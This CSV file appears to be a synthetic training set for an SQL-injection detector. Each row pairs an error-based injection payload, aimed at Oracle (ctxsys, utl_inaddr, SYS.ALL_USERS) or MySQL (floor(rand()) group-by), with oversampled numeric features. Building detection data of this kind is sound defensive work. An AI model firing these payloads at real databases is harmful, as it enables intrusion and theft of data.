id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000025,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,0.2523739689546589,333.68668221257474,33.068668221257475,3.460734572911288,81.20600466377242,49.0,146.13733644251494,57.34334110628737,0.243356869643559,0.14685256018336562,0.4379610873175353,0.1718294828555401,1.2060046637724176,0.0,0.0,0.0,0.0,2.0686682212574725,0.0,30.931331778742525,0.137336442514945,0.0,1.0,22.06866822125747,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0686682212574725,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0686682212574725
SMOTE_000026,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,4.451218019089285,275.97271055327894,41.13399427565927,4.255279868692833,130.32629803323215,21.58437244966166,91.80769624242711,32.25434382795801,0.4810881697973187,0.0725785456838255,0.3303051985954594,0.11602808592339636,3.477667620723455,0.0,0.0,0.0,0.9553352414469103,3.0446647585530897,0.0,14.776676207234551,0.0,4.611661896382724,2.9106704828938206,4.95533524144691,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.47766762072345514,0.0,2.9553352414469103,0.0,1.5223323792765449,2.0,1.0446647585530897,0.47766762072345514,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4776676207234551,0.0,0.0,0.0,0.0,0.0,0.47766762072345514,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.47766762072345514,0.0,0.0,0.0,9.433002862170365
SMOTE_000027,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000024,2.380316007962116,230.86722457243425,39.19057581650612,3.834195684563511,67.12418810272324,43.19057581650612,94.82869097980733,25.723769673397555,0.28938021768445576,0.18710972797261863,0.41144280954955775,0.1120672447933679,0.0,1.0,1.3618848366987768,0.0,1.0,2.0,0.0,16.0,0.0,0.0,3.361884836698777,4.361884836698777,0.0,1.0,0.3618848366987768,0.6381151633012232,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.7237696733975536,0.0,1.0,0.3618848366987768,0.3618848366987768,0.6381151633012231,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6381151633012231,0.0,0.6381151633012232,0.6381151633012232,7.0
SMOTE_000028,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000024,2.0243077112276575,230.10989675393512,39.579551750513275,3.8353873151562157,68.79168975188202,41.212138001368736,95.10606900068437,25.0,0.2985013679700858,0.17867410073475934,0.41390807880073904,0.1089164524944159,0.4734827498289078,0.5265172501710922,1.0,0.0,1.0,1.5265172501710924,0.0,16.473482749828907,0.0,0.0,3.0,3.526517250171092,0.4734827498289078,0.5265172501710922,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.5265172501710923,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.526517250171092
SMOTE_000029,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000005,2.8458935669272987,223.2191331471269,36.08024767224945,3.8628503232384106,71.75925698325165,40.893003103667404,86.08024767224944,24.486625387958426,0.32029044478880475,0.18275955488618958,0.3871150817401957,0.10983491858480997,1.4866253879584252,0.0,0.5133746120415748,0.0,0.5133746120415748,1.4866253879584255,0.0,15.02674922408315,0.0,0.0,3.9732507759168505,3.4866253879584246,1.0,0.0,0.0,0.5133746120415749,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.4866253879584252,0.0,0.48662538795842536,0.0,0.0,0.5133746120415748,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5133746120415748,0.0,1.0,1.0,6.0
SMOTE_000030,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,0.8752790096329849,255.0750615591878,36.0,4.0167811514471765,97.40203447314516,35.0,90.9440196989401,31.729007387102534,0.3815561632991747,0.13744573689544204,0.3565998362247291,0.12439826358065414,1.7290073871025347,0.0,0.0,0.0,2.0,1.2430024623675116,0.0,18.0,0.0,2.0,5.756997537632488,3.243002462367511,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.4860049247350231,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.486004924735022
SMOTE_000031,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000008,0.7022020097082303,337.1203113443081,34.0,3.485814305104665,80.84812453772324,52.7067704481027,146.28270817924107,57.282708179241084,0.23978248880676023,0.15630287343463012,0.4339884160663265,0.16992622169228316,0.0,0.1413540896205402,1.1413540896205403,0.0,0.0,2.14135408962054,0.0,30.858645910379458,0.0,0.0,1.0,23.282708179241077,0.0,0.1413540896205402,0.1413540896205402,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.14135408962054022,1.0,0.1413540896205402,0.8586459103794597,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.14135408962054
SMOTE_000032,attack,error,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp",nearest_attack_euclidean,R000013,1.6639582228644871,347.977308234412,35.348461177058645,3.669897979236796,94.76499765088117,50.93192470323611,142.60615529176545,59.67423058852932,0.2724059338793658,0.14631920194953604,0.4097777911356519,0.17149707303544628,0.0,3.022691765587963,1.325769411470679,0.0,0.0,3.0,0.0,28.651538822941358,0.0,2.0226917655879633,0.32576941147067906,24.32576941147068,0.0,1.0,0.32576941147067895,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.325769411470679,1.0,1.0,0.6742305885293209,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000033,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000020,0.13738499196872397,300.6179519913224,38.01993393520395,4.020994087517963,110.82059458316446,43.239207222447384,108.49834838009872,38.05980180561185,0.3687672276325534,0.14378842125989277,0.3608334914296757,0.1266108596778782,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.079735740815796,0.039867870407897854,1.9601321295921024,5.019933935203949,5.980066064796051,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.039867870407898,0.059801805611846115,0.9800660647960511,1.980066064796051,0.03986787040789774,0.9800660647960511,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9800660647960511,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,11.059801805611846
SMOTE_000034,attack,error,"1""  )   as mwja where 7881  =  7881 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000025,2.5528038712850574,321.1836451121556,39.753638238319056,4.06059417628477,111.24636176168094,59.67636863551748,115.67636863551748,34.58454607943968,0.3466244524599912,0.18562205451581726,0.3600582190253901,0.1076952739988015,1.6618156822412622,0.5845460794396844,1.1690921588793688,0.0,2.0,1.5845460794396844,0.0,20.584546079439683,0.0,0.0,6.0,5.753638238319053,0.4154539205603156,0.5845460794396844,0.5845460794396844,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.5845460794396844,1.0,1.0,0.41545392056031555,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000035,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,0.864072444555752,277.0474108575903,36.60948217151806,4.024467938020044,107.84762945712049,36.21896434303612,98.82844651455417,34.15237054287952,0.3895567071184178,0.1305593233275763,0.3565643216123143,0.1233196479416917,3.542888371361456,0.0,0.3047410857590294,0.0,2.0,2.0,0.0,18.30474108575903,0.0,2.0,5.0,4.30474108575903,1.0,0.0,0.15237054287951468,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.15237054287951468,2.0,1.6952589142409706,0.15237054287951468,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000036,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000008,0.3133039715582203,334.81742940425636,33.90871470212818,3.47423334018563,80.09128529787182,51.726144106384545,146.0,57.0,0.23921102794537719,0.15448659357821246,0.436059838707172,0.1702425397692384,0.0912852978718186,0.0,0.9087147021281814,0.0,0.0,2.0,0.0,31.0,0.0,0.0,1.0,22.90871470212818,0.0912852978718186,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0912852978718186,0.9087147021281814,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000037,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000024,2.7384848905908137,229.3425342201117,38.91830968216281,3.821412824847785,66.08957679221865,42.91830968216281,94.50197161859536,25.832676127134878,0.2867208321087104,0.18716807109454364,0.4127900052740079,0.11332109152273806,0.0,1.0,1.416338063567439,0.0,1.0,2.0,0.0,16.0,0.0,0.0,3.416338063567439,4.416338063567439,0.0,1.0,0.41633806356743897,0.583661936432561,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.832676127134878,0.0,1.0,0.41633806356743897,0.4163380635674391,0.583661936432561,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.583661936432561,0.0,0.583661936432561,0.583661936432561,7.0
SMOTE_000038,attack,error,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000029,0.8875815011117908,344.16390848975914,34.0,3.5391417686414055,84.33254528278832,50.33018113115327,148.0,61.501182075817525,0.24503369195215852,0.14618259568502603,0.4300519911996306,0.1787317211631849,0.0,3.501182075817524,0.3325452827883176,0.0,0.0,3.0,0.0,30.0,1.6674547172116823,0.0,1.0,23.332545282788317,0.0,1.0,0.16627264139415876,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.1662726413941588,1.0,1.8337273586058411,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000039,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000017,1.562499195848336,281.0680646316616,37.717893758528525,3.9428136779514475,100.91438335607606,36.914383356076065,105.95719167803803,37.282106241471475,0.35896689249611446,0.13111694697223547,0.37707207088204603,0.1328440896496041,0.23929791950950796,3.042808321961968,0.4785958390190162,0.0,2.0,2.0,0.0,20.0,1.5214041609809836,2.0,5.0,4.478595839019016,0.23929791950950807,0.7607020804904919,0.23929791950950804,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.23929791950950813,2.0,0.7607020804904919,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000040,attack,error,1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R000003,1.1385361342981426,346.506554449704,34.0,3.6194806299366715,91.58951288047359,54.205243559763204,142.4104871195264,58.3013108899408,0.2644038577680432,0.1564054794392049,0.41093747770830685,0.1682531850844451,0.6986891100591998,0.30131088994080035,2.0,0.0,0.0,3.0,0.0,28.602621779881602,0.0,2.0960673301775987,0.30131088994080013,25.0,0.6986891100591996,0.3013108899408005,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000041,attack,error,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,nearest_attack_euclidean,R000022,2.152930770202277,339.5308207525545,34.78131132106364,3.699567612776881,99.31213207361817,46.17196698159545,136.82803301840454,57.21868867893636,0.29226743909218966,0.13613066837239352,0.40306859431233455,0.16853329822308227,2.4373773578727262,0.0,0.3906556605318184,0.0,0.0,2.0,0.0,28.0,0.0,3.0,0.0,22.390655660531817,0.6093443394681816,0.0,0.0,0.3906556605318185,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.2186886789363631,0.39065566053181844,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.609344339468182
SMOTE_000042,attack,error,"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000016,0.750350975673082,349.55928930357277,34.293807130951485,3.571779064967947,87.90974635118465,55.67786791071832,146.82477147619406,59.14690356547574,0.2515299493026543,0.15925380221035623,0.4200073709323932,0.16920887755459627,0.0,1.440710696427226,1.8530964345242582,0.0,0.0,3.0,0.0,29.706192869048515,0.0,0.44071069642722616,0.8530964345242578,24.853096434524257,0.0,1.0,0.853096434524258,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.853096434524258,1.0,1.0,0.14690356547574202,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000043,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000009,0.6097680256013684,213.6943305732962,38.0,3.763614622485892,63.0,37.0,90.12955371553082,23.564776857765406,0.2948601604180876,0.17317184024554352,0.4217299196526997,0.11023807968366914,0.2823884288827032,0.0,1.0,0.0,1.0,1.0,0.0,16.282388428882705,0.0,0.0,3.0,3.0,0.2823884288827031,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000044,attack,error,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000012,0.8051605898677292,334.37784934147027,38.77481004390198,3.862964985622926,103.57632969268613,55.0,134.80151964878414,41.0,0.30970456049673556,0.16454096263048684,0.40309666836641467,0.1226578085063629,4.0,0.0,0.0,0.0,2.0,2.0,0.0,24.450379912196038,1.549620087803964,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.774810043901982,0.22518995609801795,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000045,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000009,2.784537618150668,212.3987751678244,37.20244966435119,3.73708110154512,59.80979865740476,38.19632550347321,89.79755033564881,24.595100671297615,0.2816359836964495,0.1798181044717605,0.422769724537629,0.11577618729416099,0.0,0.3987751678244047,1.3987751678244047,0.0,1.0,1.3987751678244047,0.0,16.0,0.0,0.0,3.3987751678244047,3.7975503356488085,0.0,0.3987751678244048,0.39877516782440475,0.6012248321755954,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.7975503356488094,0.0,0.39877516782440475,0.3987751678244047,0.3987751678244048,0.6012248321755953,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6012248321755953,0.0,0.6012248321755953,0.6012248321755953,6.398775167824405
SMOTE_000046,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000020,0.921387189665891,288.6479737688893,37.554822500740755,4.021497042649537,107.21599125629642,41.21929000296302,103.77081375703719,36.44187875259264,0.37167165044902567,0.14271652113556452,0.35942788433830136,0.12618394407710845,3.3322337511111337,0.0,0.0,0.0,2.0,1.777411250370378,0.0,19.554822500740755,0.0,2.0,5.222588749629622,5.332233751111134,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.7774112503703776,0.0,0.777411250370378,2.0,0.0,0.7774112503703778,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.332233751111133
SMOTE_000047,attack,error,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000021,3.1424001328367765,272.8406604634905,33.756973881806964,3.7066350645877186,86.09323806720316,35.89721044727722,113.7848694090348,37.06534253997531,0.3131876358726116,0.1339387827822331,0.41751121920798334,0.13536236213717193,0.0,4.0,0.0,0.0,1.1027895527227844,2.0,0.0,21.30836865816835,1.9999999999999996,1.1027895527227842,5.0,3.1027895527227844,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.1027895527227844,0.0,0.0,1.1027895527227842,1.551394776361392,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5513947763613921,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.551394776361392,0.0,0.4486052236386079,0.4486052236386079,7.75697388180696
SMOTE_000048,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000024,1.0995751745977287,232.26240159729815,40.09611051006533,3.8748199699221657,70.6857385369062,42.58962802684087,94.58962802684087,24.397407006710218,0.30407588799018104,0.18304807567897582,0.40770859233403917,0.10516744399680397,0.0,0.6987035033551088,1.0,0.0,1.0,1.6987035033551088,0.0,16.0,0.0,0.0,3.0,3.698703503355109,0.0,0.6987035033551088,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.6987035033551088,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.698703503355109
